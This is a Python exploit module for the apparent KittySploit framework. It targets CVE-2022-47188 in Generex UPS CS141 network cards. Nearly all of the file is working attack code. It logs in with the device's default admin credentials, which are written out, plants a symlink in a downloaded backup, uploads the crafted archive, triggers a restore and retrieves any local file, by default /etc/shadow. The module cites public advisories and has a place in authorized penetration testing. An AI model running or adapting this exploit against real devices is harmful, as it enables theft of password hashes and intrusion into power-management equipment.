from pathlib import Path
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.cs141 import CS141


class Module(Auxiliary, Http_client, CS141):
    __info__ = {
        "name": "Generex CS141 CVE-2022-47188 - Arbitrary Local File Read",
        "description": (
            "Generex UPS CS141 below 2.06 allows a crafted backup archive containing a symlink to "
            "be restored, which can be abused to retrieve arbitrary local files from the device."
        ),
        "author": ["JoelGMSec", "KittySploit Team"],
        "cve": "CVE-2022-47188",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-47188",
            "https://www.incibe-cert.es/en/early-warning/ics-advisories/update-03032023-multiple-vulnerabilities-generex-ups-cs141",
        ],
        "tags": ["cs141", "backup", "symlink", "file-read"],
    }

    username = OptString("admin", "CS141 username", required=True)
    password = OptString("cs141-snmp", "CS141 password", required=True)
    try_default_credentials = OptBool(True, "Fallback to the default admin credentials", required=False)
    remote_path = OptString("/etc/shadow", "Remote file path to retrieve", required=True)
    output_path = OptString("", "Optional local file path where the retrieved file will be saved", required=False)
    wait_seconds = OptInteger(30, "Seconds to wait for restore completion", required=False)

    def check(self):
        auth_ctx = self.cs141_get_auth_context(self.username, self.password, bool(self.try_default_credentials))
        if not auth_ctx:
            return {"vulnerable": False, "reason": "Authentication failed", "confidence": "low"}

        backup = self.cs141_download_backup(auth_ctx)
        if backup:
            return {"vulnerable": True, "reason": "Backup download succeeded", "confidence": "medium"}
        return {"vulnerable": False, "reason": "Backup download failed", "confidence": "low"}

    def run(self):
        auth_ctx = self.cs141_get_auth_context(self.username, self.password, bool(self.try_default_credentials))
        if not auth_ctx:
            print_error("Unable to authenticate or prepare a default-credential context")
            return False

        backup = self.cs141_download_backup(auth_ctx)
        if not backup:
            print_error("Failed to download the current backup archive")
            return False

        ctx = None
        try:
            ctx = self.cs141_extract_backup(backup)
            target_link = ctx["system_dir"] / "etc" / "gxserve" / "rccmd.pem"
            target_link.parent.mkdir(parents=True, exist_ok=True)
            if target_link.exists() or target_link.is_symlink():
                target_link.unlink()
            target_link.symlink_to(self.remote_path)

            evil_backup = self.cs141_rebuild_backup(ctx)
            response = self.cs141_upload_backup(evil_backup, auth_ctx)
            if not response or not getattr(response, "ok", False):
                print_error("Failed to upload the crafted backup archive")
                return False

            self.cs141_trigger_restore(auth_ctx)
            print_status(f"Restore triggered, waiting {self.wait_seconds} second(s)...")
            time.sleep(int(self.wait_seconds))
        finally:
            if ctx:
                self.cs141_cleanup_workdir(ctx)

        auth_ctx = self.cs141_get_auth_context(self.username, self.password, bool(self.try_default_credentials))
        if not auth_ctx:
            print_error("Re-authentication failed after restore")
            return False

        restored_backup = self.cs141_download_backup(auth_ctx)
        if not restored_backup:
            print_error("Failed to download the restored backup archive")
            return False

        ctx = None
        try:
            ctx = self.cs141_extract_backup(restored_backup)
            dumped_file = ctx["system_dir"] / "etc" / "gxserve" / "rccmd.pem"
            if not dumped_file.exists():
                print_error("The requested file was not recovered from the restored archive")
                return False

            content = dumped_file.read_bytes()
            fallback_name = Path(self.remote_path).name or "cs141_dump.bin"
            saved_to = self.cs141_save_output(content, self.output_path, fallback_name)
            print_success(f"Recovered file saved to {saved_to}")

            preview = content[:300].decode("utf-8", errors="replace").strip()
            if preview:
                print_info("Preview:")
                print_info(preview)
            return True
        finally:
            if ctx:
                self.cs141_cleanup_workdir(ctx)
